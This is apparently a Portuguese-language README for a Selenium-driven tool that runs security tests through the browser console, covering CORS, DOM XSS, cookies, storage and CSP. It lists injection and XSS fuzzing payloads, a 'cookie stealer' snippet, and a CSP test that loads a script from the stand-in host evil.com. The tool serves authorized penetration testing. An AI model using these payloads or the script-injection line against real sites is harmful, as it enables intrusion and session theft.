# Console Tester

Executor de testes de segurança via console JavaScript do navegador.

## Recursos

✅ **8 Testes Predefinidos:**
- CORS vulnerabilities
- API enumeration
- Fetch API testing
- DOM-based XSS detection
- Storage analysis (localStorage, sessionStorage, cookies)
- Cookie security
- CSP (Content Security Policy) analysis
- API fuzzing

✅ **Modo Interativo**
✅ **Execução de JavaScript customizado**
✅ **Análise automática de vulnerabilidades**

## Instalação

```bash
pip install selenium beautifulsoup4
```

## Uso Básico

```bash
# Todos os testes automáticos
python3 console_tester.py https://example.com

# Modo interativo
python3 console_tester.py https://example.com '{"interactive": true}'

# Headless mode
python3 console_tester.py https://example.com '{"headless": true}'

# Firefox
python3 console_tester.py https://example.com '{"browser": "firefox"}'
```

## Testes Predefinidos

### 1. CORS Test

Testa vulnerabilidades de Cross-Origin Resource Sharing.

```javascript
run cors
```

**Verifica:**
- Se API aceita requests de origens diferentes
- Header `Access-Control-Allow-Origin`
- Credenciais (`Access-Control-Allow-Credentials`)

**Vulnerável se:**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### 2. API Enumeration

Enumera endpoints API comuns.

```javascript
run api_enum
```

**Testa:**
```
/api, /api/v1, /api/v2
/rest, /graphql
/users, /user, /admin
/config, /settings, /status
/health, /version, /info
```

**Output:**
```json
{
  "test": "API_Enumeration",
  "found": [
    {"endpoint": "/api/v1", "status": 200},
    {"endpoint": "/admin", "status": 403}
  ],
  "count": 2
}
```

### 3. Fetch API Test

Testa segurança da API.

```javascript
run fetch_test
```

**Verifica:**
- Autenticação requerida
- Métodos HTTP permitidos (GET, POST, PUT, DELETE, etc.)
- Rate limiting

### 4. DOM XSS Test

Detecta vulnerabilidades XSS baseadas em DOM.

```javascript
run xss_dom
```

**Procura:**
- **Sources:** `location.hash`, `location.search`
- **Sinks:** `innerHTML`, `eval`, `setTimeout`

**Potencialmente vulnerável se:**
```javascript
// Source
const param = location.search;

// Sink
element.innerHTML = param; // ❌ Vulnerable!
```

### 5. Storage Analysis

Analisa storage local e cookies.

```javascript
run local_storage
```

**Examina:**
- localStorage
- sessionStorage
- document.cookie

**Detecta dados sensíveis:**
```
token, password, secret, key, auth
```

**Output:**
```json
{
  "test": "Storage_Analysis",
  "results": {
    "localStorage": [
      {"key": "auth_token", "value": "eyJhbGc...", "sensitive": true}
    ],
    "cookies": [
      {"key": "session", "value": "abc123", "sensitive": true}
    ]
  },
  "sensitive_data_found": true
}
```

### 6. Cookie Security

Testa segurança de cookies.

```javascript
run cookie_test
```

**Verifica:**
- Cookies acessíveis via JavaScript (sem HttpOnly)
- Possibilidade de set cookies

**Issues:**
```json
{
  "issue": "Cookies accessible via JavaScript",
  "severity": "medium",
  "description": "Cookies without HttpOnly flag can be stolen via XSS"
}
```

### 7. CSP Test

Analisa Content Security Policy.

```javascript
run csp_test
```

**Verifica:**
- Meta tag CSP
- Violations de CSP
- Se `eval()` é permitido

**Vulnerável se:**
```
No CSP configured
OR
eval() allowed
```

### 8. API Fuzzing

Fuzz parâmetros da URL atual.

```javascript
run api_fuzzing
```

**Payloads:**
```
', ", <, >, .., ../
1'OR'1'='1
<script>alert(1)</script>
${7*7}, {{7*7}}
```

**Detecta:**
- Reflexão de payload (XSS)
- Mensagens de erro (SQL injection)

## Modo Interativo

```bash
python3 console_tester.py https://example.com '{"interactive": true}'
```

### Comandos

```javascript
// Executar JavaScript
JS> document.title
"Example Site"

// Fetch API
JS> fetch('/api/users').then(r => r.json())
[{id: 1, name: "Alice"}, ...]

// Executar teste predefinido
JS> run cors

// Listar testes
JS> list

// Help
JS> help

// Sair
JS> quit
```

### Exemplos Práticos

#### Testar API específica
```javascript
JS> fetch('/api/admin', {
      method: 'GET',
      credentials: 'include'
    }).then(r => r.json())
```

#### Analisar headers
```javascript
JS> fetch('/api/data')
      .then(r => {
        const headers = {};
        r.headers.forEach((v, k) => headers[k] = v);
        return headers;
      })
```

#### Manipular storage
```javascript
JS> Object.keys(localStorage).forEach(k => {
      console.log(k + ':', localStorage.getItem(k));
    })
```

#### Testar WebSocket
```javascript
JS> const ws = new WebSocket('wss://example.com/socket');
    ws.onopen = () => console.log('Connected');
    ws.onmessage = e => console.log('Received:', e.data);
    ws.send(JSON.stringify({type: 'test'}));
```

#### Enumerar endpoints
```javascript
JS> const endpoints = ['/api/users', '/api/admin', '/api/config'];
    Promise.all(endpoints.map(e =>
      fetch(e).then(r => ({endpoint: e, status: r.status}))
    )).then(results => console.table(results))
```

## Scripts Customizados

### JWT Decoder
```javascript
JS> const token = localStorage.getItem('auth_token');
    const [header, payload, sig] = token.split('.');
    const decoded = JSON.parse(atob(payload));
    console.log(decoded);
```

### Cookie Stealer (para teste)
```javascript
JS> document.cookie.split(';').forEach(c => {
      const [name, value] = c.trim().split('=');
      console.log(`${name}: ${value}`);
    })
```

### Form Data Extractor
```javascript
JS> const forms = document.querySelectorAll('form');
    forms.forEach((form, i) => {
      console.log(`Form ${i}:`, form.action);
      const inputs = form.querySelectorAll('input, textarea');
      inputs.forEach(input => {
        console.log(` - ${input.name}: ${input.type}`);
      });
    })
```

### API Response Analyzer
```javascript
JS> fetch('/api/sensitive')
      .then(r => r.text())
      .then(text => {
        // Check for sensitive data
        const patterns = [
          /password/gi,
          /secret/gi,
          /token/gi,
          /key/gi
        ];

        patterns.forEach(p => {
          const matches = text.match(p);
          if (matches) {
            console.log(`Found: ${p} (${matches.length} times)`);
          }
        });
      })
```

## Integração

### Com Proxy

```bash
# Terminal 1: Iniciar proxy
python3 proxy/pentest_proxy.py 8888

# Terminal 2: Console tester com proxy
python3 console_tester.py https://example.com '{
    "browser": "chrome",
    "proxy_enabled": true,
    "proxy_port": 8888
}'
```

### Com Selenium Interactive

```python
# Usar ambos na mesma sessão
from plugins.interactive_testing.selenium_interactive import InteractivePentester
from console_testing.console_tester import ConsoleTester

# Reusar driver
tester = ConsoleTester(target, options)
tester.driver = interactive_tester.driver  # Reuse driver

# Execute console tests
tester.run_all_tests()
```

## Output

```json
{
  "target": "https://example.com",
  "tests": [
    {
      "description": "cors",
      "script": "(async () => { ... })()",
      "result": {
        "test": "CORS",
        "vulnerable": true,
        "results": [...]
      },
      "timestamp": "2024-01-01T12:00:00"
    }
  ],
  "vulnerabilities": [
    {
      "type": "cors",
      "severity": "high",
      "details": {...},
      "timestamp": "2024-01-01T12:00:00"
    }
  ]
}
```

## Casos de Uso

### 1. API Security Audit

```bash
python3 console_tester.py https://api.example.com '{"interactive": true}'

JS> run api_enum     # Discover endpoints
JS> run fetch_test   # Test auth and methods
JS> run api_fuzzing  # Fuzz parameters
```

### 2. Client-Side Security

```bash
python3 console_tester.py https://app.example.com

# Automatic tests will check:
# - DOM XSS
# - Storage security
# - Cookie flags
# - CSP
```

### 3. CORS Misconfiguration

```bash
python3 console_tester.py https://api.example.com

# Check CORS test results
cat results.json | jq '.vulnerabilities[] | select(.type == "cors")'
```

### 4. Token/Secret Detection

```bash
python3 console_tester.py https://example.com '{"interactive": true}'

JS> run local_storage

# Check for sensitive data
JS> localStorage.getItem('token')
```

## Tips & Tricks

### Bypass CSP (for testing)
```javascript
// Test if CSP blocks external scripts
JS> const script = document.createElement('script');
    script.src = 'https://evil.com/malicious.js';
    document.body.appendChild(script);
```

### Test JSONP endpoints
```javascript
JS> const script = document.createElement('script');
    script.src = 'https://api.example.com/data?callback=alert';
    document.body.appendChild(script);
```

### Check for exposed APIs
```javascript
JS> Object.keys(window).filter(k =>
      typeof window[k] === 'object' &&
      k.toLowerCase().includes('api')
    )
```

### Test postMessage
```javascript
JS> window.addEventListener('message', e => {
      console.log('Received:', e.data, 'from:', e.origin);
    });

    // Send to parent
    window.parent.postMessage({test: 'data'}, '*');
```

## Troubleshooting

### Script timeout
```python
# Aumentar timeout do WebDriver
driver.set_script_timeout(60)  # 60 segundos
```

### CORS errors
```bash
# Usar Chrome com security disabled
chrome --disable-web-security --user-data-dir=/tmp/chrome
```

### Async errors
```javascript
// Use await no modo interativo
JS> await fetch('/api/data').then(r => r.json())
```

## Limitações

- JavaScript executado no contexto do browser
- Sujeito a Same-Origin Policy
- CSP pode bloquear algumas operações
- Não pode acessar HTTP-only cookies

## Boas Práticas

1. **Sempre teste em ambientes autorizados**
2. **Use headless mode para automação**
3. **Combine com proxy para análise completa**
4. **Salve evidências (screenshots, logs)**
5. **Documente vulnerabilidades encontradas**

## Aviso

⚠️ Use apenas em ambientes autorizados. Testes não autorizados são ilegais.
